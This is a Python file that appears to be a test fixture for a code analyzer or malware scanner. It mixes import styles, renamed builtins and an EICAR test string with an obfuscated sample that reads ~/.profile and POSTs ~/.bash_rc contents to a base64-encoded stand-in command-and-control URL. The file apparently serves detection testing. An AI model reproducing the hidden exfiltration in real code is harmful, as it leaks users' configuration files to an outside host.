import pprint as fabulous  # Rename imported module
# Various module import styles
import ab.cd
from a.b.c import d
from x import y as z
from .. import relative

from requests import post  # Import only function from a module
# Simple obfuscation of URL
url = 'aHR0cDovL21hbHd' + 'hcmUuY29tL0NuQw==\n'

blah = open  # Rename builtin function

d = {
    'func': blah
}

somefile = d['func']('~/.profile')

payload = somefile.read()

test_url = "https://example.com/index.html"

with blah('~/.bash_rc') as fd:
    # Local context sensitive
    post(url.decode('base64'), body=fd.read())

# This statement works only in Python 2; can't be parsed in Python 3
print "test"

cpx = 12 + 3j # complex number

fabulous.pprint("adalaraoawa aoalalaeaH"[::-2])  # String "Hello world" after slicing

eval("print('$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!')")
